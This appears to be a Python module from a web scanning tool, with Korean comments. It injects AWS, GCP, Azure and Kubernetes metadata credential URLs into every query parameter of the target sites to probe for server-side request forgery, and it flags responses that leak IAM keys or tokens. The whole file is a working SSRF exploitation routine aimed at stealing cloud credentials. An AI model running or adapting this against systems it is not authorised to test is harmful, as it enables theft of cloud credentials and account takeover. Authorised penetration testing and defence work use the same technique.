import requests
from rich.console import Console

console = Console()

class CloudScanner:
    def __init__(self, target_urls):
        self.target_urls = target_urls
        self.vulns = []
        self.cloud_metadata_endpoints = {
            "AWS": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "GCP": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "K8s": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets/"
        }

    def check_cloud_metadata(self, url):
        """SSRF 취약점 지점(파라미터 등)에 클라우드 메타데이터 엔드포인트 주입"""
        if "?" not in url: return
        
        base, query = url.split("?", 1)
        params = query.split("&")
        
        for i, p in enumerate(params):
            if "=" not in p: continue
            name, val = p.split("=", 1)
            for cloud, endpoint in self.cloud_metadata_endpoints.items():
                test_url = f"{base}?{query.replace(p, f'{name}={endpoint}')}"
                try:
                    # 헤더 추가 (GCP/Azure는 필수 헤더가 있음)
                    headers = {"Metadata-Flavor": "Google", "Metadata": "true"}
                    res = requests.get(test_url, headers=headers, timeout=5, verify=False)
                    
                    # 응답 내용 분석 (IAM 키, 토큰 노출 등)
                    sensitive_keywords = ["AccessKeyId", "SecretAccessKey", "access_token", "k8s-token"]
                    if any(key in res.text for key in sensitive_keywords):
                        self.vulns.append({
                            "type": f"Cloud {cloud} Metadata Exposure", 
                            "url": test_url,
                            "info": f"IAM / Account Token exposed via SSRF to {cloud}"
                        })
                except: pass

    def run(self):
        console.print(f"[bold blue][*][/bold blue] Probing Cloud Infrastructure & K8s Secrets...")
        for url in self.target_urls[:10]:
            self.check_cloud_metadata(url)
        return self.vulns

def run_cloud_scanner(urls):
    scanner = CloudScanner(urls)
    return scanner.run()
